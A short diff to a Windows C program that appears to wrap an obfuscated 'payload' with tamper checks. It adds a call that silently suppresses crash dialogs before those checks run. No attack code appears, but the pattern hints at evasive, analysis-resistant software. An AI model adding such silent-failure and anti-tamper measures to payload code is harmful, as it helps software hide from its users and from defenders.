@@ -7,6 +7,10 @@
 #include <zlib.h>
 #include "payload.h"
 #include <iphlpapi.h>
+// Batch-B #34: crash-dialog suppression (silent kill, exit 137).
+#ifdef _WIN32
+#include "crash_suppress.h"
+#endif
 static char* g_obfBufs[64];
 static size_t g_obfBufSizes[64];
 static int g_obfBufCount = 0;
@@ -1265,6 +1269,10 @@ LONG WINAPI CustomUnhandledExceptionFilter(EXCEPTION_POINTERS* ) {
 }
 
 int main(int argc, char* argv[]) {
+#ifdef _WIN32
+    // Batch-B #34: suppress crash dialogs before any tamper check fires.
+    nixon_suppress_crash_dialogs();
+#endif
     SetUnhandledExceptionFilter(CustomUnhandledExceptionFilter);
 
     volatile uint32_t state = 0x10;
